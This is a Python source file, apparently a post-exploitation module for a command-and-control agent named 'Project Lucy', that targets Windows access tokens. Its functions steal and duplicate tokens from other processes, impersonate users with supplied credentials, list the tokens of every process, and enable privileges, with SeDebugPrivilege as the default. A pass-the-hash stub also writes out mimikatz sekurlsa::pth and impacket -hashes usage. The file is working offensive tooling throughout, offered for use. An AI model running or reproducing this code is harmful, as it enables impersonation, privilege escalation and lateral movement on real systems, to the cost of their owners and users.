"""
Token impersonation and privilege escalation module for Project Lucy agent.
Creates, steals, and manages Windows access tokens via ctypes calls to
advapi32 for LogonUser, OpenProcessToken, DuplicateTokenEx, and
ImpersonateLoggedOnUser. Also enumerates privileges and enables specific
privileges on the current process token.
Actions: make_token, steal_token, get_uid, rev_to_self, list_tokens,
         make_token_hash, get_privileges, enable_privilege.
"""
import ctypes
import platform
from ctypes import wintypes

name = "token"
version = "1.0.0"
os_compat = ["Windows"]
dependencies: list[str] = []

SYSTEM = platform.system()

# --- advapi32 / kernel32 bindings ---------------------------------------------

advapi32 = ctypes.WinDLL("advapi32", use_last_error=True)
kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)

# Logon types
LOGON32_LOGON_NEW_CREDENTIALS = 0x00000009
LOGON32_LOGON_INTERACTIVE = 0x00000002
LOGON32_PROVIDER_DEFAULT = 0x00000000

# Token access rights
TOKEN_ASSIGN_PRIMARY = 0x00000001
TOKEN_DUPLICATE = 0x00000002
TOKEN_IMPERSONATE = 0x00000004
TOKEN_QUERY = 0x00000008
TOKEN_QUERY_SOURCE = 0x00000010
TOKEN_ADJUST_PRIVILEGES = 0x00000020
TOKEN_ADJUST_DEFAULT = 0x00000040
TOKEN_ADJUST_SESSIONID = 0x00000080
TOKEN_ALL_ACCESS = (
    TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY
    | TOKEN_QUERY_SOURCE | TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_DEFAULT
    | TOKEN_ADJUST_SESSIONID
)

# Process access rights
PROCESS_QUERY_INFORMATION = 0x0400
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000

# Security impersonation levels
SecurityAnonymous = 0
SecurityIdentification = 1
SecurityImpersonation = 2
SecurityDelegation = 3

# Token types
TokenPrimary = 1
TokenImpersonation = 2

# Token information classes
TokenUser = 1
TokenPrivileges = 3
TokenType = 8

# Name format constants
NameSamCompatible = 2
NameFullyQualifiedDN = 1

# Privilege display names
SE_PRIVILEGE_ENABLED = 0x00000002
SE_PRIVILEGE_ENABLED_BY_DEFAULT = 0x00000001
SE_PRIVILEGE_REMOVED = 0x00000004


class LUID(ctypes.Structure):
    _fields_ = [
        ("LowPart", wintypes.DWORD),
        ("HighPart", wintypes.LONG),
    ]


class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Luid", LUID),
        ("Attributes", wintypes.DWORD),
    ]


class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [
        ("PrivilegeCount", wintypes.DWORD),
        ("Privileges", LUID_AND_ATTRIBUTES * 1),
    ]


class TOKEN_USER(ctypes.Structure):
    _fields_ = [
        ("Sid", wintypes.LPVOID),
        ("Attributes", wintypes.DWORD),
    ]


# Function prototypes
advapi32.LogonUserA.restype = wintypes.BOOL
advapi32.LogonUserA.argtypes = [
    wintypes.LPCSTR, wintypes.LPCSTR, wintypes.LPCSTR,
    wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE),
]

advapi32.ImpersonateLoggedOnUser.restype = wintypes.BOOL
advapi32.ImpersonateLoggedOnUser.argtypes = [wintypes.HANDLE]

advapi32.RevertToSelf.restype = wintypes.BOOL
advapi32.RevertToSelf.argtypes = []

advapi32.OpenProcessToken.restype = wintypes.BOOL
advapi32.OpenProcessToken.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE),
]

advapi32.DuplicateTokenEx.restype = wintypes.BOOL
advapi32.DuplicateTokenEx.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID,
    wintypes.DWORD, wintypes.DWORD, ctypes.POINTER(wintypes.HANDLE),
]

advapi32.GetTokenInformation.restype = wintypes.BOOL
advapi32.GetTokenInformation.argtypes = [
    wintypes.HANDLE, wintypes.DWORD, wintypes.LPVOID,
    wintypes.DWORD, ctypes.POINTER(wintypes.DWORD),
]

advapi32.LookupPrivilegeValueA.restype = wintypes.BOOL
advapi32.LookupPrivilegeValueA.argtypes = [
    wintypes.LPCSTR, wintypes.LPCSTR, ctypes.POINTER(LUID),
]

advapi32.AdjustTokenPrivileges.restype = wintypes.BOOL
advapi32.AdjustTokenPrivileges.argtypes = [
    wintypes.HANDLE, wintypes.BOOL, ctypes.POINTER(TOKEN_PRIVILEGES),
    wintypes.DWORD, wintypes.LPVOID, wintypes.LPVOID,
]

advapi32.GetUserNameExA.restype = wintypes.BOOL
advapi32.GetUserNameExA.argtypes = [
    wintypes.DWORD, wintypes.LPSTR, ctypes.POINTER(wintypes.DWORD),
]

advapi32.ConvertSidToStringSidA.restype = wintypes.BOOL
advapi32.ConvertSidToStringSidA.argtypes = [
    wintypes.LPVOID, ctypes.POINTER(wintypes.LPSTR),
]

kernel32.OpenProcess.restype = wintypes.HANDLE
kernel32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]

kernel32.CloseHandle.restype = wintypes.BOOL
kernel32.CloseHandle.argtypes = [wintypes.HANDLE]

kernel32.GetCurrentProcess.restype = wintypes.HANDLE
kernel32.GetCurrentProcess.argtypes = []

kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE
kernel32.CreateToolhelp32Snapshot.argtypes = [wintypes.DWORD, wintypes.DWORD]

kernel32.Process32First.restype = wintypes.BOOL
kernel32.Process32First.argtypes = [wintypes.HANDLE, wintypes.LPVOID]

kernel32.Process32Next.restype = wintypes.BOOL
kernel32.Process32Next.argtypes = [wintypes.HANDLE, wintypes.LPVOID]


# Module-level token storage
_stored_token: wintypes.HANDLE | None = None


class PROCESSENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize", wintypes.DWORD),
        ("cntUsage", wintypes.DWORD),
        ("th32ProcessID", wintypes.DWORD),
        ("th32DefaultHeapID", ctypes.POINTER(ctypes.c_ulong)),
        ("th32ModuleID", wintypes.DWORD),
        ("cntThreads", wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase", wintypes.LONG),
        ("dwFlags", wintypes.DWORD),
        ("szExeFile", ctypes.c_char * 260),
    ]


TH32CS_SNAPPROCESS = 0x00000002


def _close(handle: wintypes.HANDLE) -> None:
    """Close a Windows handle safely."""
    if handle:
        kernel32.CloseHandle(handle)


def _get_last_error_msg() -> str:
    """Return a human-readable error message for the last Win32 error."""
    err = ctypes.get_last_error()
    return f"Win32 error {err}"


def _make_token(username: str, password: str, domain: str) -> dict:
    """Create a token from credentials using LogonUserA."""
    global _stored_token
    token_handle = wintypes.HANDLE()

    success = advapi32.LogonUserA(
        username.encode("utf-8"),
        domain.encode("utf-8") if domain else b".",
        password.encode("utf-8"),
        LOGON32_LOGON_NEW_CREDENTIALS,
        LOGON32_PROVIDER_DEFAULT,
        ctypes.byref(token_handle),
    )

    if not success:
        return {
            "status": "failed",
            "error": f"LogonUserA failed: {_get_last_error_msg()}",
        }

    # Store the token handle
    if _stored_token:
        _close(_stored_token)
    _stored_token = token_handle

    # Impersonate
    imp_success = advapi32.ImpersonateLoggedOnUser(token_handle)
    if not imp_success:
        return {
            "status": "failed",
            "error": f"ImpersonateLoggedOnUser failed: {_get_last_error_msg()}",
            "data": {"token_created": True, "impersonated": False},
        }

    return {
        "status": "completed",
        "data": {
            "token_created": True,
            "impersonated": True,
            "username": username,
            "domain": domain or ".",
            "logon_type": "NEW_CREDENTIALS",
        },
    }


def _steal_token(pid: int) -> dict:
    """Steal a token from a running process."""
    global _stored_token

    # Open the process
    proc_handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
    if not proc_handle:
        proc_handle = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)
    if not proc_handle:
        return {
            "status": "failed",
            "error": f"OpenProcess failed for PID {pid}: {_get_last_error_msg()}",
        }

    try:
        # Open the process token
        token_handle = wintypes.HANDLE()
        if not advapi32.OpenProcessToken(
            proc_handle, TOKEN_DUPLICATE | TOKEN_QUERY, ctypes.byref(token_handle)
        ):
            return {
                "status": "failed",
                "error": f"OpenProcessToken failed: {_get_last_error_msg()}",
            }

        try:
            # Duplicate the token
            dup_handle = wintypes.HANDLE()
            if not advapi32.DuplicateTokenEx(
                token_handle, TOKEN_ALL_ACCESS, None,
                SecurityImpersonation, TokenPrimary, ctypes.byref(dup_handle)
            ):
                return {
                    "status": "failed",
                    "error": f"DuplicateTokenEx failed: {_get_last_error_msg()}",
                }

            # Store the duplicated token
            if _stored_token:
                _close(_stored_token)
            _stored_token = dup_handle

            # Impersonate
            imp_success = advapi32.ImpersonateLoggedOnUser(dup_handle)
            if not imp_success:
                return {
                    "status": "failed",
                    "error": f"ImpersonateLoggedOnUser failed: {_get_last_error_msg()}",
                    "data": {"token_duplicated": True, "impersonated": False, "pid": pid},
                }

            return {
                "status": "completed",
                "data": {
                    "token_stolen": True,
                    "impersonated": True,
                    "pid": pid,
                },
            }
        finally:
            _close(token_handle)
    finally:
        _close(proc_handle)


def _get_uid() -> dict:
    """Get the current user SID and username."""
    # Get username via GetUserNameExA
    buf = ctypes.create_string_buffer(256)
    buf_size = wintypes.DWORD(256)
    username = ""
    if advapi32.GetUserNameExA(NameSamCompatible, buf, ctypes.byref(buf_size)):
        username = buf.value.decode("utf-8", errors="replace")

    # Get SID from current process token
    sid_str = ""
    proc_handle = kernel32.GetCurrentProcess()
    token_handle = wintypes.HANDLE()
    if advapi32.OpenProcessToken(
        proc_handle, TOKEN_QUERY, ctypes.byref(token_handle)
    ):
        try:
            # Query token user info
            ret_len = wintypes.DWORD(0)
            advapi32.GetTokenInformation(
                token_handle, TokenUser, None, 0, ctypes.byref(ret_len)
            )
            if ret_len.value > 0:
                buf_info = (ctypes.c_char * ret_len.value)()
                if advapi32.GetTokenInformation(
                    token_handle, TokenUser, buf_info, ret_len.value, ctypes.byref(ret_len)
                ):
                    # TOKEN_USER layout: SID pointer + DWORD attributes
                    sid_ptr = ctypes.cast(
                        ctypes.cast(buf_info, ctypes.POINTER(wintypes.LPVOID))[0],
                        wintypes.LPVOID,
                    )
                    sid_lpstr = wintypes.LPSTR()
                    if advapi32.ConvertSidToStringSidA(sid_ptr, ctypes.byref(sid_lpstr)):
                        sid_str = sid_lpstr.value.decode("utf-8", errors="replace")
        finally:
            _close(token_handle)

    if not username and not sid_str:
        return {"status": "failed", "error": "Could not retrieve user info"}

    return {
        "status": "completed",
        "data": {
            "username": username,
            "sid": sid_str,
        },
    }


def _rev_to_self() -> dict:
    """Revert to self — stop impersonation."""
    global _stored_token
    success = advapi32.RevertToSelf()
    if not success:
        return {"status": "failed", "error": f"RevertToSelf failed: {_get_last_error_msg()}"}

    if _stored_token:
        _close(_stored_token)
        _stored_token = None

    return {
        "status": "completed",
        "data": {"reverted": True, "message": "Reverted to self, token cleared"},
    }


def _list_tokens() -> dict:
    """List tokens from all accessible processes."""
    snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    if not snapshot:
        return {"status": "failed", "error": f"CreateToolhelp32Snapshot failed: {_get_last_error_msg()}"}

    tokens = []
    entry = PROCESSENTRY32()
    entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

    try:
        if not kernel32.Process32First(snapshot, ctypes.byref(entry)):
            return {"status": "failed", "error": "Process32First failed"}

        while True:
            pid = entry.th32ProcessID
            exe_name = entry.szExeFile.decode("utf-8", errors="replace")
            token_info = {"pid": pid, "process": exe_name, "accessible": False, "sid": "", "type": ""}

            proc_handle = kernel32.OpenProcess(PROCESS_QUERY_INFORMATION, False, pid)
            if not proc_handle:
                proc_handle = kernel32.OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, False, pid)

            if proc_handle:
                token_handle = wintypes.HANDLE()
                if advapi32.OpenProcessToken(
                    proc_handle, TOKEN_QUERY, ctypes.byref(token_handle)
                ):
                    token_info["accessible"] = True

                    # Get SID
                    ret_len = wintypes.DWORD(0)
                    advapi32.GetTokenInformation(
                        token_handle, TokenUser, None, 0, ctypes.byref(ret_len)
                    )
                    if ret_len.value > 0:
                        buf_info = (ctypes.c_char * ret_len.value)()
                        if advapi32.GetTokenInformation(
                            token_handle, TokenUser, buf_info, ret_len.value, ctypes.byref(ret_len)
                        ):
                            sid_ptr = ctypes.cast(
                                ctypes.cast(buf_info, ctypes.POINTER(wintypes.LPVOID))[0],
                                wintypes.LPVOID,
                            )
                            sid_lpstr = wintypes.LPSTR()
                            if advapi32.ConvertSidToStringSidA(sid_ptr, ctypes.byref(sid_lpstr)):
                                token_info["sid"] = sid_lpstr.value.decode("utf-8", errors="replace")

                    # Get token type
                    ret_len2 = wintypes.DWORD(0)
                    advapi32.GetTokenInformation(
                        token_handle, TokenType, None, 0, ctypes.byref(ret_len2)
                    )
                    if ret_len2.value >= 4:
                        type_val = wintypes.DWORD(0)
                        if advapi32.GetTokenInformation(
                            token_handle, TokenType, ctypes.byref(type_val),
                            ret_len2.value, ctypes.byref(ret_len2)
                        ):
                            token_info["type"] = "Primary" if type_val.value == TokenPrimary else "Impersonation"

                    _close(token_handle)

                _close(proc_handle)

            tokens.append(token_info)

            if not kernel32.Process32Next(snapshot, ctypes.byref(entry)):
                break
    finally:
        _close(snapshot)

    accessible_count = sum(1 for t in tokens if t["accessible"])

    return {
        "status": "completed",
        "data": {
            "tokens": tokens,
            "total_processes": len(tokens),
            "accessible_tokens": accessible_count,
        },
    }


def _make_token_hash(username: str, ntlm_hash: str, domain: str) -> dict:
    """Create a token from an NTLM hash.

    This is a simplified version that documents the approach. Native Windows
    LogonUserA does not accept NTLM hashes directly. In practice, this would
    require either:
      1. mimikatz sekurlsa::pth to inject the hash into LSASS, then use the
         resulting token, or
      2. A custom SSP/credential provider that accepts hash-based logon.
    Here we attempt the LogonUserA call with the hash as the password (which
    will fail for real hashes) and document the expected workflow.
    """
    global _stored_token

    # Document the approach
    approach = (
        "Native LogonUserA does not accept NTLM hashes. The standard approach is:\n"
        "1. Use mimikatz: sekurlsa::pth /user:USERNAME /domain:DOMAIN /ntlm:HASH\n"
        "2. The injected credential allows token creation via LogonUserA\n"
        "3. Alternatively, use impacket's psexec/wmiexec with -hashes flag\n"
        "Attempting LogonUserA with hash as password (will likely fail)..."
    )

    token_handle = wintypes.HANDLE()
    success = advapi32.LogonUserA(
        username.encode("utf-8"),
        domain.encode("utf-8") if domain else b".",
        ntlm_hash.encode("utf-8"),
        LOGON32_LOGON_NEW_CREDENTIALS,
        LOGON32_PROVIDER_DEFAULT,
        ctypes.byref(token_handle),
    )

    if not success:
        return {
            "status": "failed",
            "error": f"LogonUserA with hash failed (expected): {_get_last_error_msg()}",
            "data": {
                "username": username,
                "domain": domain or ".",
                "approach": approach,
            },
        }

    # If it somehow succeeds (e.g. hash happens to be a valid password)
    if _stored_token:
        _close(_stored_token)
    _stored_token = token_handle

    advapi32.ImpersonateLoggedOnUser(token_handle)

    return {
        "status": "completed",
        "data": {
            "token_created": True,
            "impersonated": True,
            "username": username,
            "domain": domain or ".",
            "note": approach,
        },
    }


def _get_privileges() -> dict:
    """Enumerate current token privileges."""
    proc_handle = kernel32.GetCurrentProcess()
    token_handle = wintypes.HANDLE()
    if not advapi32.OpenProcessToken(
        proc_handle, TOKEN_QUERY, ctypes.byref(token_handle)
    ):
        return {"status": "failed", "error": f"OpenProcessToken failed: {_get_last_error_msg()}"}

    try:
        # Query token privileges
        ret_len = wintypes.DWORD(0)
        advapi32.GetTokenInformation(
            token_handle, TokenPrivileges, None, 0, ctypes.byref(ret_len)
        )

        if ret_len.value == 0:
            return {"status": "failed", "error": "GetTokenInformation returned 0 length"}

        buf = (ctypes.c_char * ret_len.value)()
        if not advapi32.GetTokenInformation(
            token_handle, TokenPrivileges, buf, ret_len.value, ctypes.byref(ret_len)
        ):
            return {"status": "failed", "error": f"GetTokenInformation failed: {_get_last_error_msg()}"}

        # Parse TOKEN_PRIVILEGES
        priv_count = ctypes.cast(buf, ctypes.POINTER(wintypes.DWORD))[0]
        privileges = []

        # Each LUID_AND_ATTRIBUTES is 12 bytes (8 for LUID + 4 for DWORD)
        offset = 4  # Skip PrivilegeCount
        for i in range(priv_count):
            luid_and_attr = LUID_AND_ATTRIBUTES.from_buffer_copy(buf, offset + i * 12)
            enabled = bool(luid_and_attr.Attributes & SE_PRIVILEGE_ENABLED)
            enabled_by_default = bool(luid_and_attr.Attributes & SE_PRIVILEGE_ENABLED_BY_DEFAULT)
            privileges.append({
                "luid": f"{luid_and_attr.Luid.HighPart}:{luid_and_attr.Luid.LowPart}",
                "attributes": luid_and_attr.Attributes,
                "enabled": enabled,
                "enabled_by_default": enabled_by_default,
            })

        return {
            "status": "completed",
            "data": {
                "privileges": privileges,
                "count": len(privileges),
            },
        }
    finally:
        _close(token_handle)


def _enable_privilege(privilege: str) -> dict:
    """Enable a specific privilege on the current process token."""
    proc_handle = kernel32.GetCurrentProcess()
    token_handle = wintypes.HANDLE()
    if not advapi32.OpenProcessToken(
        proc_handle,
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
        ctypes.byref(token_handle),
    ):
        return {"status": "failed", "error": f"OpenProcessToken failed: {_get_last_error_msg()}"}

    try:
        luid = LUID()
        if not advapi32.LookupPrivilegeValueA(
            None, privilege.encode("utf-8"), ctypes.byref(luid)
        ):
            return {"status": "failed", "error": f"LookupPrivilegeValueA failed for '{privilege}': {_get_last_error_msg()}"}

        tp = TOKEN_PRIVILEGES()
        tp.PrivilegeCount = 1
        tp.Privileges[0].Luid = luid
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

        if not advapi32.AdjustTokenPrivileges(
            token_handle, False, ctypes.byref(tp), 0, None, None
        ):
            return {"status": "failed", "error": f"AdjustTokenPrivileges failed: {_get_last_error_msg()}"}

        err = ctypes.get_last_error()
        if err == 1300:  # ERROR_NOT_ALL_ASSIGNED
            return {
                "status": "failed",
                "error": f"Privilege '{privilege}' not assigned to current token",
            }

        return {
            "status": "completed",
            "data": {
                "privilege": privilege,
                "enabled": True,
            },
        }
    finally:
        _close(token_handle)


def run(action: str = "get_uid", **params) -> dict:
    if SYSTEM != "Windows":
        return {"status": "failed", "error": "Windows-only action"}

    try:
        if action == "make_token":
            return _make_token(
                params["username"],
                params["password"],
                params.get("domain", "."),
            )
        elif action == "steal_token":
            return _steal_token(int(params["pid"]))
        elif action == "get_uid":
            return _get_uid()
        elif action == "rev_to_self":
            return _rev_to_self()
        elif action == "list_tokens":
            return _list_tokens()
        elif action == "make_token_hash":
            return _make_token_hash(
                params["username"],
                params["ntlm_hash"],
                params.get("domain", "."),
            )
        elif action == "get_privileges":
            return _get_privileges()
        elif action == "enable_privilege":
            return _enable_privilege(params.get("privilege", "SeDebugPrivilege"))
        return {"status": "failed", "error": f"Unknown action: {action}"}
    except KeyError as exc:
        return {"status": "failed", "error": f"Missing required parameter: {exc}"}
    except Exception as exc:
        return {"status": "failed", "error": str(exc)}
